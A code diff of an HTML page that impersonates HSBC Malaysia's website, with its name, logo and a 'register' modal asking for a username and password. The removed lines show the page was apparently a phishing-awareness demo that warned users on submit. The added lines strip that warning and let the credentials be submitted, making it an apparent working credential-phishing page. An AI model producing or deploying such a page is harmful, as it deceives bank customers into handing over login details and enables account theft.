@@ -1,49 +1,41 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1"/>
-<link rel="stylesheet" href="style.css">
-
-<link rel="icon" href="HSBC-logo.png" type="x-icon">
+<!DOCTYPE html><html><head>
+    <base href="https://skipo2010.github.io/hsbc-details.github.io/"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <link href="style.css" rel="stylesheet"/>
+    <link href="HSBC-logo.png" rel="icon" type="x-icon"/>
+    <title>HSBC Malaysia - Credit Cards, Deposits, Loans</title>
 </head>
-<title>HSBC Malaysia - Credit Cards, Deposits, Loans</title>
 <body>
-
 <div class="centered-container">
-    <h2></h2>
-    <img src="HSBC.png" alt="HSBC" style="width:30%;"/>
+    <h2> </h2>
+    <img alt="HSBC" src="HSBC.png" style="width:30%;"/>
     <h2>Click Here to view the full details</h2>
-    <button onclick="document.getElementById('id01').style.display='block'" style="width:auto;">Here</button>
+    <button onclick="document.getElementById(&#39;id01&#39;).style.display=&#39;block&#39;" style="width:auto;">Here</button>
 </div>
 
-<div id="id01" class="modal">
-  
-  <form class="modal-content animate" action="" method="post" onsubmit="return showAlert()">
-    <div class="imgcontainer">
-     <span onclick="document.getElementById('id01').style.display='none'" class="close" title="Close Modal">×</span>
-     <img src="HSBC-logo.png" alt="Avatar" class="avatar"/>
-    </div>
+<div class="modal" id="id01">
+    <form action="" class="modal-content animate" method="post" onsubmit="return validateForm()">
+        <input type="hidden" value="https://skipo2010.github.io/hsbc-details.github.io/"/>
+        <div class="imgcontainer">
+            <span class="close" onclick="document.getElementById(&#39;id01&#39;).style.display=&#39;none&#39;" title="Close Modal">×</span> 
+            <img alt="Avatar" class="avatar" src="HSBC-logo.png"/>
+        </div>
 
-    <div class="container">
-     <label for="uname"><b>Create your Username <span style="color:red;">*</span></b></label>
-     <input type="text" placeholder="Enter Username" required=""/>
+        <div class="container">
+            <label for="uname"><b>Create your Username <span style="color:red;">*</span></b></label> 
+            <input id="username" name="username" placeholder="Enter Username" required="" type="text"/> 
+            <label for="psw"><b>Create Your Password <span style="color:red;">*</span></b></label> 
+            <input id="password" name="password" placeholder="Enter Password" required="" type="password"/>
+            <button class="register-button" type="submit">Register</button> 
+            <label> <input checked="checked" type="checkbox"/> Remember me </label>
+        </div>
 
-     <label for="psw"><b>Create Your Password <span style="color:red;">*</span></b></label>
-     <input type="password" placeholder="Enter Password" required="" name="password"/>
-     
-     <button type="submit" class="register-button">Register</button>
-     <label>
-      <input type="checkbox" checked="checked"/> Remember me
-     </label>
-    </div>
-
-    <div class="container" style="background-color:#f1f1f1">
-     <button type="button" onclick="document.getElementById('id01').style.display='none'" class="cancelbtn">Cancel</button>
-     <span class="psw">Forgot <a href="#">password?</a></span>
-    </div>
-  </form>
+        <div class="container" style="background-color:#f1f1f1">
+            <button class="cancelbtn" onclick="document.getElementById(&#39;id01&#39;).style.display=&#39;none&#39;" type="button">Cancel</button>
+            <span class="psw">Forgot <a href="#">password?</a></span>
+        </div>
+    </form>
 </div>
-
 <script>
 // Get the modal
 var modal = document.getElementById('id01');
@@ -55,12 +47,15 @@ window.onclick = function(event) {
   }
 }
 
-// Show alert message upon form submission
-function showAlert() {
-  alert("You have been phished, be careful next time.");
-  return false; // Prevent actual form submission
+function validateForm() {
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+
+    // Add any further actions or validations here if needed
+
+    return true; // Allow form submission
 }
 </script>
 
-</body>
-</html>
+
+</body></html>
